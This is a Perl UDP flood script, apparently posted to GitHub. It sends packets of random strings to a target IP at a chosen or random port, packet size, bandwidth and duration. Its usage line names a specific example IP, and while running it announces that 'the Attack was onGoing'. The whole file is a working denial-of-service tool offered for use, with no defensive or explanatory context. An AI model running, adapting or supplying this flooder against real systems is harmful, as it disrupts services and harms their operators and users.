#!/usr/bin/perl
STDOUT->autoflush();
use Socket;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

sub generate_random_string{
     my $length_of_randomstring = shift;
     my @chars=('a'..'z','A'..'Z','0'..'9');
     my $random_string;
     for(my $i = 0; $i < int(rand(100-124)+64); $i++){
       $random_string .= $chars[int(rand(58))];
  }
     return $random_string;
}

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
    "port=i" => \$port,        # UDP port to use, numeric, 0=random
    "size=i" => \$size,        # packet size, number, 0=random
    "bandwidth=i" => \$bw,        # bandwidth to consume
    "time=i" => \$time,        # time to run
    "delay=f"=> \$delay,        # inter-packet delay
    "help|?" => \$help);        # help
    

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 Command ---> perl udp-random-string.pl 162.241.27.65
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: The package size overrides the parameter --the command will be ignored\n";
  $size = int($bw * $delay / 1);
} elsif ($bw) {
  $delay = (1 * $size) / $bw;
}

$size = 700 if $bw && !$size;

($bw = int($size / $delay * 1)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "[0;32m Uploaded by cyberceros at Github | Ctrl + C to Terminate process ---> \n";
printf "[0;32m The Attack was onGoing :) ---> \n";


die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  my $packet_data = generate_random_string();

  send(flood, pack("a$psize",$packet_data), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(2000 * $delay) if $delay;
}
